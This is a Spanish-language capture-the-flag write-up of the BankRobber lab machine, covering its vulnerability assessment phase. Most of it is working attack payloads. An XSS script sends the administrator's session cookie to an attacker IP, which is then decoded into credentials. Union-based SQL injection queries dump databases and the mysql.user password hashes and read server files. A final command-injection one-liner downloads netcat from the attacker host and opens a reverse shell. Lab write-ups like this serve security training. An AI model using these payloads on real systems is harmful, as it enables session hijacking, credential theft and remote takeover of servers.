## Vulnerability Assessment {-}

### XSS {-}

Testeamos que accion puede efectuar el administrador y por el mismo tiempo, si el input de comment es vulnerable a un **XSS**.

1. Nos montamos un servidor web en python

    ```bash
    python3 -m http.server 80
    ```

1. Modificamos los valores de la transferencia

    ```bash
    Amount: 1
    ID of Addressee: 1
    Comment to him/her: <script src="http://10.10.17.51/diamondjackson.jpg"></script>
    ```

Aqui vemos que esta vulnerable a XSS porque recibimos una peticion GET.


La idea aqui seria robar la cookie de session del administrador.

1. Checkeamos nuestra propria cookie de session con Burpsuite

    ```{r, echo = FALSE, fig.cap="get cookie with Burpsuite", out.width="90%"}
        knitr::include_graphics("images/BankRobber-mycookie.png")
    ```

1. Como la cookie esta URL encodeada le damos a Ctrl+Shift+U y copiamos la cookie
1. Analyzamos la cookie

    - Tiene 3 campos, *id* - *username* - *password*
    - Decodificamos el username

        ```bash
        echo "czR2aXRhcg==" | base64 -d; echo
        #Output
        s4vitar
        ```
    
    - Decodificamos el password

        ```bash
        echo "czR2aXRhcjEyMw==" | base64 -d; echo
        #Output
        s4vitar123
        ```

    Aqui vemos que la cookie unicamente esta encryptada en base64.

1. Intentamos robar la cookie del admin.

    - Creamos un fichero test.js

        ```javascript
        var request = new XMLHttpRequest();
        request.open('GET', 'http://10.10.17.51/?cookie='+document.cookie, true);
        request.send();
        ```

    - Creamos un servidor web con python

        ```bash
        python3 -m http.server 80
        ```

    - Modificamos nuevamente los valores de la transferencia
    
        ```bash
        Amount: 1
        ID of Addressee: 1
        Comment to him/her: <script src="http://10.10.17.51/test.js"></script>
        ```

    Aqui ya vemos la cookie de session del administrador.

1. Decodificamos la cookie del admin.

    ```bash
    php --interactive
    php > echo urldecode("username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D")
    #Output
    username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==

    echo "YWRtaW4=" | base64 -d; echo
    #Output
    admin

    echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d; echo
    #Output
    Hopelessromantic
    ```

1. Nos conectamos a la web como el usuario admin.

Hay un link user.txt que nos muestra un mensaje TODO que seria de mover todos los ficheros al Default Xampp folder.
Buscando por internet vemos que este directorio seria `C:\xampp\htdocs`.

En la pagina principal, vemos un panel de administracion. Aqui vemos 2 cosas,

- Un campo que nos permitiria ejecutar comandos en la maquina victima
- Un campo Search users que es en beta. Nos permite buscar usuarios por su ID

El campo para ejecutar comandos no funcciona porque tendriamos que estar loggeado desde la maquina victima atacando este servicio por localhost.
Ademas con Burpsuite, vemos que esta utilidad lanza una peticion a `/admin/backdoorchecker.php` con un parametro `cmd=...`

Como no podemos hacer gran cosa por el momento, analyzamos el campo de busqueda de usuarios.

```bash
1 -> admin
2 -> gio
3 -> s4vitar
1' -> There is a problem with your SQL syntax
```

### SQL Injection {-}

```bash
1' or 1=1-- - 
#Output
1,admin
2,gio
3,s4vitar
```

Seguimos la guia normal de un SQLI

1. Cuantas columnas hay

    ```bash
    1' order by 100-- -         -> There is a problem with your SQL syntax
    1' union select 1,2-- -     -> There is a problem with your SQL syntax
    1' union select 1,2,3-- -
    #Output
    1,admin
    1,2
    ```

    Vemos que hay 3 columnas y vemos la 1 y la 2.

1. Cual es la base de datos

    ```bash
    1' union select 1,database(),3-- -
    #Output
    1,admin
    1,bankrobber
    ```

1. Cual es el usuario que esta actualmente coriendo la base de datos

    ```bash
    1' union select 1,user(),3-- -
    #Output
    1,admin
    1,root@localhost 
    ```

1. Cual es la version de la base de datos

    ```bash
    1' union select 1,version(),3-- -
    #Output
    1,admin
    1,10.1.38-MariaDB
    ```

1. Cual son las otras bases de datos que existen

    ```bash
    1' union select 1,schema_name,3 from information_schema.schemata-- -
    #Output
    1,admin
    1,bankrobber
    1,information_schema
    1,mysql
    1,performance
    1,phpmyadmin
    1,test
    ```

    S4vi nos adelanta que en la base de datos de bankrobber estan unas credenciales de usuarios, pero que no nos sirben porque ya somos admin.
    miramos por la db mysql

1. Buscamos credenciales

    ```bash
    1' union select 1,group_concat(User,0x3a,Password),3 from mysql.user-- -
    #Output
    1,admin
    1,root:*F435735A173757E57BD36B09048B8B610FF4D0C4
    ```

1. Crackeo de hash con john

    ```bash
    echo "root:*F435735A173757E57BD36B09048B8B610FF4D0C4" > credentials.txt
    john --wordlist=/usr/shar/wordlists/rockyou.txt credentials.txt
    ```

    Vemos que no podemos romper el hash

1. Intentamos leer ficheros

    ```bash
    1' union select 1,load_file("C:\\Windows\\System32\\drivers\\etc\\hosts"),3-- -
    ```

    El fichero `\etc\hosts` no nos interesa en este caso pero hemos podido comprobar si podiamos leer ficheros.


    miramos por el fichero `C:\\xampp\\htdocs\\admin\\backdoorchecker.php` y podemos ver la manera de ejecutar comandos bypasseando los badchars.


La idea aqui seria de ejecutar un comando de typo `cmd=dir|powershell -c "iwr -uri http://10.10.17.51/nc.exe -Outfile %temp%\\nc.exe";%temp%\\nc.exe -e cmd 10.10.17.51 443`.
El problema aqui sigue siendo el echo de no poder lanzar este comando porque no estamos lanzando esta peticion desde el localhost de la maquina victima.


